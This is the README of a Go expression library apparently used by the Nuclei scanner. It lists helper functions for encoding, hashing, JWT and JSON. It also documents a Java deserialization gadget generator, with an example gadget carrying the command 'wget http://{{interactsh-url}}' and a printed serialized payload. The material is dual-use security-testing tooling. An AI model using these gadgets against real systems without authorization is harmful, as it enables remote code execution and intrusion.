# DSL
DSL ease the creation of expressions by providing a set of built-in helper functions.

### what is DSL?
DSL is a library allows to create and evaluate expressions. You can define expressions to compare, filter, or transform data, and then evaluate them against a set of data.

### Example
```go
package main

import (
	"fmt"
	"github.com/Knetic/govaluate"
	"github.com/projectdiscovery/dsl"
)

func main() {
	// Define the data to evaluate
	data := map[string]interface{}{
		"username": "johndoe",
		"email":    "johndoe@example.com",
		"password": "12345",
		"ip":       "127.0.0.1",
		"url":      "https://www.example.com",
		"date":     "2022-05-01",
	}

	// Define the expressions to evaluate
	expressions := map[string]string{
		"username_and_email_matcher": "contains(username, 'john') && contains(email, 'example.com')",
		"password_criteria":          "contains_any(password, '0123456789') && regex_any(password, '[A-Z]')",
		"sha256_username_matcher":    "sha256(username) == 'a0d95c8b32fa9b05a7d790a08e221c384b317ca05f66a7b84978d22c9838bb2a'",
		"ip_format_matcher":        "ip_format(ip, '1') == '127.0.0.1'",
		"url_valid_matcher":       "startswith(url, 'http') && contains(url, '://') && contains(url, '.') && !contains_any(url, ':@')",
	}

	for matcherName, expression := range expressions {
		compiledExpression, err := govaluate.NewEvaluableExpressionWithFunctions(expression, dsl.DefaultHelperFunctions)
		if err != nil {
			fmt.Printf("Fialed to compile expresion: %v\n", expression)
		}

		result, err := compiledExpression.Evaluate(data)
		if err != nil {
			fmt.Printf("Fialed to evaluate expresion: %v\n", expression)
		}

		if result == true {
			fmt.Printf("[%v] matches data\n", matcherName)
		} else {
			fmt.Printf("[%v] not matches data\n", matcherName)
		}
	}
}


```

### Default Helper functions list

| Helper function                                                       | Description                                                                                                         | Example                                                                                                                                              | Output                                                                                                                                                                                                                                                                                                                                                                                     |
|-----------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| aes_gcm(key, plaintext interface{}) []byte                            | AES GCM encrypts a string with key                                                                                  | `{{hex_encode(aes_gcm("AES256Key-32Characters1234567890", "exampleplaintext"))}}`                                                                    | `ec183a153b8e8ae7925beed74728534b57a60920c0b009eaa7608a34e06325804c096d7eebccddea3e5ed6c4`                                                                                                                                                                                                                                                                                                 | 
| base64(src interface{}) string                                        | Base64 encodes a string                                                                                             | `base64("Hello")`                                                                                                                                    | `SGVsbG8=`                                                                                                                                                                                                                                                                                                                                                                                 |
| base64_decode(src interface{}) []byte                                 | Base64 decodes a string                                                                                             | `base64_decode("SGVsbG8=")`                                                                                                                          | `Hello`                                                                                                                                                                                                                                                                                                                                                                                    |
| base64_py(src interface{}) string                                     | Encodes string to base64 like python (with new lines)                                                               | `base64_py("Hello")`                                                                                                                                 | `SGVsbG8=\n`                                                                                                                                                                                                                                                                                                                                                                                 |
| bin_to_dec(binaryNumber number &#124; string) float64                 | Transforms the input binary number into a decimal format                                                            | `bin_to_dec("0b1010")`<br>`bin_to_dec(1010)`                                                                                                         | `10`                                                                                                                                                                                                                                                                                                                                                                                       |
| compare_versions(versionToCheck string, constraints ...string) bool   | Compares the first version argument with the provided constraints                                                   | `compare_versions('v1.0.0', '>v0.0.1', '<v1.0.1')`                                                                                                   | `true`                                                                                                                                                                                                                                                                                                                                                                                     |
| concat(arguments ...interface{}) string                               | Concatenates the given number of arguments to form a string                                                         | `concat("Hello", 123, "world)`                                                                                                                       | `Hello123world`                                                                                                                                                                                                                                                                                                                                                                            |
| contains(input, substring interface{}) bool                           | Verifies if a string contains a substring                                                                           | `contains("Hello", "lo")`                                                                                                                            | `true`                                                                                                                                                                                                                                                                                                                                                                                     |
| contains_all(input interface{}, substrings ...string) bool                           | Verifies if any input contains all of the substrings                                                                           | `contains("Hello everyone", "lo", "every")`                                                                                                                            | `true`                                                                                                                                                                                                                                                                                                                                                                                     |
| contains_any(input interface{}, substrings ...string) bool                           | Verifies if an input contains any of substrings                                                                          | `contains("Hello everyone", "abc", "llo")`                                                                                                                            | `true`                                                                                                                                                                                                                                                                                                                                                                                     |
| date_time(dateTimeFormat string, optionalUnixTime interface{}) string | Returns the formatted date time using simplified or `go` style layout for the current or the given unix time        | `date_time("%Y-%M-%D %H:%m")`<br>`date_time("%Y-%M-%D %H:%m", 1654870680)`<br>`date_time("2006-01-02 15:04", unix_time())`                           | `2022-06-10 14:18`                                                                                                                                                                                                                                                                                                                                                                         |
| dec_to_hex(number number &#124; string) string                        | Transforms the input number into hexadecimal format                                                                 | `dec_to_hex(7001)"`                                                                                                                                  | `1b59`                                                                                                                                                                                                                                                                                                                                                                                     |
| ends_with(str string, suffix ...string) bool                          | Checks if the string ends with any of the provided substrings                                                       | `ends_with("Hello", "lo")`                                                                                                                           | `true`                                                                                                                                                                                                                                                                                                                                                                                     |
| generate_java_gadget(gadget, cmd, encoding interface{}) string        | Generates a Java Deserialization Gadget                                                                             | `generate_java_gadget("dns", "{{interactsh-url}}", "base64")`                                                                                        | `rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAAHQAAHEAfgAFdAAFcHh0ACpjYWhnMmZiaW41NjRvMGJ0MHRzMDhycDdlZXBwYjkxNDUub2FzdC5mdW54` |
| generate_jwt(json, algorithm, signature, unixMaxAge) []byte | Generates a JSON Web Token (JWT) using the claims provided in a JSON string, the signature, and the specified algorithm | `generate_jwt("{\"name\":\"John Doe\",\"foo\":\"bar\"}", "HS256", "hello-world")` | `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmb28iOiJiYXIiLCJuYW1lIjoiSm9obiBEb2UifQ.EsrL8lIcYJR_Ns-JuhF3VCllCP7xwbpMCCfHin_WT6U` |
| gzip(input string) string                                             | Compresses the input using GZip                                                                                     | `base64(gzip("Hello"))`                                                                                                                              | `+H4sIAAAAAAAA//JIzcnJBwQAAP//gonR9wUAAAA=`                                                                                                                                                                                                                                                                                                                                                |
| gzip_decode(input string) string                                      | Decompresses the input using GZip                                                                                   | `gzip_decode(hex_decode("1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000"))`                                                              | `Hello`                                                                                                                                                                                                                                                                                                                                                                                    |
| hex_decode(input interface{}) []byte                                  | Hex decodes the given input                                                                                         | `hex_decode("6161")`                                                                                                                                 | `aa`                                                                                                                                                                                                                                                                                                                                                                                       |
| hex_encode(input interface{}) string                                  | Hex encodes the given input                                                                                         | `hex_encode("aa")`                                                                                                                                   | `6161`                                                                                                                                                                                                                                                                                                                                                                                     |
| hex_to_dec(hexNumber number &#124; string) float64                    | Transforms the input hexadecimal number into decimal format                                                         | `hex_to_dec("ff")`<br>`hex_to_dec("0xff")`                                                                                                           | `255`                                                                                                                                                                                                                                                                                                                                                                                      |
| hmac(algorithm, data, secret) string                                  | hmac function that accepts a hashing function type with data and secret                                             | `hmac("sha1", "test", "scrt")`                                                                                                                       | `8856b111056d946d5c6c92a21b43c233596623c6`                                                                                                                                                                                                                                                                                                                                                 |
| html_escape(input interface{}) string                                 | HTML escapes the given input                                                                                        | `html_escape("<body>test</body>")`                                                                                                                   | `&lt;body&gt;test&lt;/body&gt;`                                                                                                                                                                                                                                                                                                                                                            |
| html_unescape(input interface{}) string                               | HTML un-escapes the given input                                                                                     | `html_unescape("&lt;body&gt;test&lt;/body&gt;")`                                                                                                     | `<body>test</body>`                                                                                                                                                                                                                                                                                                                                                                        |
| index(slice, index) interface{}                               | Select item at index from slice or string (zero based)                                                                                     | `index("test",0)`                                                                                                     | `t`                                                                                                                                                                                                                                                                                                                                                                        |
| join(separator string, elements ...interface{}) string                | Joins the given elements using the specified separator                                                              | `join("_", 123, "hello", "world")`                                                                                                                   | `123_hello_world`                                                                                                                                                                                                                                                                                                                                                                          |
| json_minify(json) string | Minifies a JSON string by removing unnecessary whitespace | `json_minify("{ \"name\": \"John Doe\", \"foo\": \"bar\" }")` | `{"foo":"bar","name":"John Doe"}` |
| json_prettify(json) string | Prettifies a JSON string by adding indentation | `json_prettify("{\"foo\":\"bar\",\"name\":\"John Doe\"}")` | `{\n \"foo\": \"bar\",\n \"name\": \"John Doe\"\n}` |
| len(arg interface{}) int                                              | Returns the length of the input                                                                                     | `len("Hello")`                                                                                                                                       | `5`                                                                                                                                                                                                                                                                                                                                                                                        |
| line_ends_with(str string, suffix ...string) bool                     | Checks if any line of the string ends with any of the provided substrings                                           | `line_ends_with("Hello\nHi", "lo")`                                                                                                                  | `true`                                                                                                                                                                                                                                                                                                                                                                                     |
| line_starts_with(str string, prefix ...string) bool                   | Checks if any line of the string starts with any of the provided substrings                                         | `line_starts_with("Hi\nHello", "He")`                                                                                                                | `true`                                                                                                                                                                                                                                                                                                                                                                                     |
| llm_prompt(str string) string | Query OpenAI LLM (default GPT 3.5) with the provided text prompt and result the result as string (requires api token as environment variable `OPENAI_API_KEY`) | `llm_prompt("produce a generic json")` | `{'a':'b'}` |
| md5(input interface{}) string                                         | Calculates the MD5 (Message Digest) hash of the input                                                               | `md5("Hello")`                                                                                                                                       | `8b1a9953c4611296a827abf8c47804d7`                                                                                                                                                                                                                                                                                                                                                         |
| mmh3(input interface{}) string                                        | Calculates the MMH3 (MurmurHash3) hash of an input                                                                  | `mmh3("Hello")`                                                                                                                                      | `316307400`                                                                                                                                                                                                                                                                                                                                                                                |
| oct_to_dec(octalNumber number &#124; string) float64                  | Transforms the input octal number into a decimal format                                                             | `oct_to_dec("0o1234567")`<br>`oct_to_dec(1234567)`                                                                                                   | `342391`                                                                                                                                                                                                                                                                                                                                                                                   |
| print_debug(args ...interface{})                                      | Prints the value of a given input or expression. Used for debugging.                                                | `print_debug(1+2, "Hello")`                                                                                                                          | `3 Hello`                                                                                                                                                                                                                                                                                                                                                                                  |
| rand_base(length uint, optionalCharSet string) string                 | Generates a random sequence of given length string from an optional charset (defaults to letters and numbers)       | `rand_base(5, "abc")`                                                                                                                                | `caccb`                                                                                                                                                                                                                                                                                                                                                                                    |
| rand_char(optionalCharSet string) string                              | Generates a random character from an optional character set (defaults to letters and numbers)                       | `rand_char("abc")`                                                                                                                                   | `a`                                                                                                                                                                                                                                                                                                                                                                                        |
| rand_int(optionalMin, optionalMax uint) int                           | Generates a random integer between the given optional limits (defaults to 0 - MaxInt32)                             | `rand_int(1, 10)`                                                                                                                                    | `6`                                                                                                                                                                                                                                                                                                                                                                                        |
| rand_text_alpha(length uint, optionalBadChars string) string          | Generates a random string of letters, of given length, excluding the optional cutset characters                     | `rand_text_alpha(10, "abc")`                                                                                                                         | `WKozhjJWlJ`                                                                                                                                                                                                                                                                                                                                                                               |
| rand_text_alphanumeric(length uint, optionalBadChars string) string   | Generates a random alphanumeric string, of given length without the optional cutset characters                      | `rand_text_alphanumeric(10, "ab12")`                                                                                                                 | `NthI0IiY8r`                                                                                                                                                                                                                                                                                                                                                                               |
| rand_ip(cidr ...string) string                                        | Generates a random IP address                                                                                       | `rand_ip("192.168.0.0/24")`                                                                                                                          | `192.168.0.171`                                                                                                                                                                                                                                                                                                                                                                            |
| rand_text_numeric(length uint, optionalBadNumbers string) string      | Generates a random numeric string of given length without the optional set of undesired numbers                     | `rand_text_numeric(10, 123)`                                                                                                                         | `0654087985`                                                                                                                                                                                                                                                                                                                                                                               |
| regex(pattern, input string) bool                                     | Tests the given regular expression against the input string                                                         | `regex("H([a-z]+)o", "Hello")`                                                                                                                       | `true`                                                                                                                                                                                                                                                                                                                                                                                     |
| remove_bad_chars(input, cutset interface{}) string                    | Removes the desired characters from the input                                                                       | `remove_bad_chars("abcd", "bc")`                                                                                                                     | `ad`                                                                                                                                                                                                                                                                                                                                                                                       |
| repeat(str string, count uint) string                                 | Repeats the input string the given amount of times                                                                  | `repeat("../", 5)`                                                                                                                                   | `../../../../../`                                                                                                                                                                                                                                                                                                                                                                          |
| replace(str, old, new string) string                                  | Replaces a given substring in the given input                                                                       | `replace("Hello", "He", "Ha")`                                                                                                                       | `Hallo`                                                                                                                                                                                                                                                                                                                                                                                    |
| replace_regex(source, regex, replacement string) string               | Replaces substrings matching the given regular expression in the input                                              | `replace_regex("He123llo", "(\\d+)", "")`                                                                                                            | `Hello`                                                                                                                                                                                                                                                                                                                                                                                    |
| reverse(input string) string                                          | Reverses the given input                                                                                            | `reverse("abc")`                                                                                                                                     | `cba`                                                                                                                                                                                                                                                                                                                                                                                      |
| sha1(input interface{}) string                                        | Calculates the SHA1 (Secure Hash 1) hash of the input                                                               | `sha1("Hello")`                                                                                                                                      | `f7ff9e8b7bb2e09b70935a5d785e0cc5d9d0abf0`                                                                                                                                                                                                                                                                                                                                                 |
| sha256(input interface{}) string                                      | Calculates the SHA256 (Secure Hash 256) hash of the input                                                           | `sha256("Hello")`                                                                                                                                    | `185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969`                                                                                                                                                                                                                                                                                                                         |
| starts_with(str string, prefix ...string) bool                        | Checks if the string starts with any of the provided substrings                                                     | `starts_with("Hello", "He")`                                                                                                                         | `true`                                                                                                                                                                                                                                                                                                                                                                                     |
| to_lower(input string) string                                         | Transforms the input into lowercase characters                                                                      | `to_lower("HELLO")`                                                                                                                                  | `hello`                                                                                                                                                                                                                                                                                                                                                                                    |
| to_unix_time(input string, layout string) int                         | Parses a string date time using default or user given layouts, then returns its Unix timestamp                      | `to_unix_time("2022-01-13T16:30:10+00:00")`<br>`to_unix_time("2022-01-13 16:30:10")`<br>`to_unix_time("13-01-2022 16:30:10". "02-01-2006 15:04:05")` | `1642091410`                                                                                                                                                                                                                                                                                                                                                                               |
| to_upper(input string) string                                         | Transforms the input into uppercase characters                                                                      | `to_upper("hello")`                                                                                                                                  | `HELLO`                                                                                                                                                                                                                                                                                                                                                                                    |
| trim(input, cutset string) string                                     | Returns a slice of the input with all leading and trailing Unicode code points contained in cutset removed          | `trim("aaaHelloddd", "ad")`                                                                                                                          | `Hello`                                                                                                                                                                                                                                                                                                                                                                                    |
| trim_left(input, cutset string) string                                | Returns a slice of the input with all leading Unicode code points contained in cutset removed                       | `trim_left("aaaHelloddd", "ad")`                                                                                                                     | `Helloddd`                                                                                                                                                                                                                                                                                                                                                                                 |
| trim_prefix(input, prefix string) string                              | Returns the input without the provided leading prefix string                                                        | `trim_prefix("aaHelloaa", "aa")`                                                                                                                     | `Helloaa`                                                                                                                                                                                                                                                                                                                                                                                  |
| trim_right(input, cutset string) string                               | Returns a string, with all trailing Unicode code points contained in cutset removed                                 | `trim_right("aaaHelloddd", "ad")`                                                                                                                    | `aaaHello`                                                                                                                                                                                                                                                                                                                                                                                 |
| trim_space(input string) string                                       | Returns a string, with all leading and trailing white space removed, as defined by Unicode                          | `trim_space("  Hello  ")`                                                                                                                            | `"Hello"`                                                                                                                                                                                                                                                                                                                                                                                  |
| trim_suffix(input, suffix string) string                              | Returns input without the provided trailing suffix string                                                           | `trim_suffix("aaHelloaa", "aa")`                                                                                                                     | `aaHello`                                                                                                                                                                                                                                                                                                                                                                                  |
| unpack(format string, sequence string/bytes) {}interface                               | Returns the result of python binary unpack for the first operand in the sequence (endianess+operand) | `unpack('>I', '\xac\xd7\t\xd0')`                                                                                                                                      | `-272646673`                                                                                                                                                                                                                                                                                                                                                                               |
| unix_time(optionalSeconds uint) float64                               | Returns the current Unix time (number of seconds elapsed since January 1, 1970 UTC) with the added optional seconds | `unix_time(10)`                                                                                                                                      | `1639568278`                                                                                                                                                                                                                                                                                                                                                                               |
| url_decode(input string) string                                       | URL decodes the input string                                                                                        | `url_decode("https:%2F%2Fprojectdiscovery.io%3Ftest=1")`                                                                                             | `https://projectdiscovery.io?test=1`                                                                                                                                                                                                                                                                                                                                                       |
| url_encode(input string) string                                       | URL encodes the input string                                                                                        | `url_encode("https://projectdiscovery.io/test?a=1")`                                                                                                 | `https%3A%2F%2Fprojectdiscovery.io%2Ftest%3Fa%3D1`                                                                                                                                                                                                                                                                                                                                         |
| wait_for(seconds uint)                                                | Pauses the execution for the given amount of seconds                                                                | `wait_for(10)`                                                                                                                                       | `true`                                                                                                                                                                                                                                                                                                                                                                                     |
| xor(sequences ...strings/bytes)                                                | Perform xor on sequences of same length                                                                | `xor('abc','def')`                                                                                                                                       | `50705` in hex                                                                                                                                                                                                                                                                                                                                                                                     |
| zlib(input string) string                                             | Compresses the input using Zlib                                                                                     | `base64(zlib("Hello"))`                                                                                                                              | `eJzySM3JyQcEAAD//wWMAfU=`                                                                                                                                                                                                                                                                                                                                                                 |
| zlib_decode(input string) string                                      | Decompresses the input using Zlib                                                                                   | `zlib_decode(hex_decode("789cf248cdc9c907040000ffff058c01f5"))`                                                                                      | `Hello`                                                                                                                                                                                                                                                                                                                                                                                    |

**Supported encodings:**

- `base64` (default)
- `gzip-base64`
- `gzip`
- `hex`
- `raw`

**Deserialization helper function format:**

```yaml
{{generate_java_gadget(payload, cmd, encoding}}
```

**Deserialization helper function example:**

```yaml
{{generate_java_gadget("commons-collections3.1", "wget http://{{interactsh-url}}", "base64")}}
```

**Binary pack/unpack**

The gostruct package provides functionality for converting Go values represented as byte slices. It uses format strings to describe the layout of the Go structs. The format characters include boolean, big endian, little endian, int, float32, float64, and string types with different packed sizes. Currently, only binary unpack of the first operand after endianess has been supported.

#### JSON helper functions

Nuclei allows manipulate JSON strings in different ways, here is a list of its functions:

- `generate_jwt`, to generates a JSON Web Token (JWT) using the claims provided in a JSON string, the signature, and the specified algorithm.
- `json_minify`, to minifies a JSON string by removing unnecessary whitespace.
- `json_prettify`, to prettifies a JSON string by adding indentation.

**Examples**

**`generate_jwt`**

To generate a JSON Web Token (JWT), you have to supply the JSON that you want to sign, _at least_.

Here is a list of supported algorithms for generating JWTs with `generate_jwt` function _(case-insensitive)_:

- `HS256`
- `HS384`
- `HS512`
- `RS256`
- `RS384`
- `RS512`
- `PS256`
- `PS384`
- `PS512`
- `ES256`
- `ES384`
- `ES512`
- `EdDSA`
- `NONE`

Empty string ("") also means `NONE`.

Format:

```yaml
{{generate_jwt(json, algorithm, signature, maxAgeUnix)}}
```

> Arguments other than `json` are optional.

Example:
```yaml
variables:
  json: | # required
    {
      "foo": "bar",
      "name": "John Doe"
    }
  alg: "HS256" # optional
  sig: "this_is_secret" # optional
  age: '{{to_unix_time("2032-12-30T16:30:10+00:00")}}' # optional
  jwt: '{{generate_jwt(json, "{{alg}}", "{{sig}}", "{{age}}")}}'
```

> The `maxAgeUnix` argument is to set the expiration `"exp"` JWT standard claim, as well as the `"iat"` claim when you call the function.

**`json_minify`**

Format:

```yaml
{{json_minify(json)}}
```

Example:

```yaml
variables:
  json: |
    {
      "foo": "bar",
      "name": "John Doe"
    }
  minify: '{{json_minify(json}}'
```

`minify` variable output:

```json
{"foo":"bar","name":"John Doe"}
```

**`json_prettify`**

Format:

```yaml
{{json_prettify(json)}}
```

Example:

```yaml
variables:
  json: '{"foo":"bar","name":"John Doe"}'
  pretty: '{{json_prettify(json}}'
```

`pretty` variable output:

```json
{
  "foo": "bar",
  "name": "John Doe"
}
```

### Thanks

Knetic/govaluate - For providing a powerful expression evaluation package.



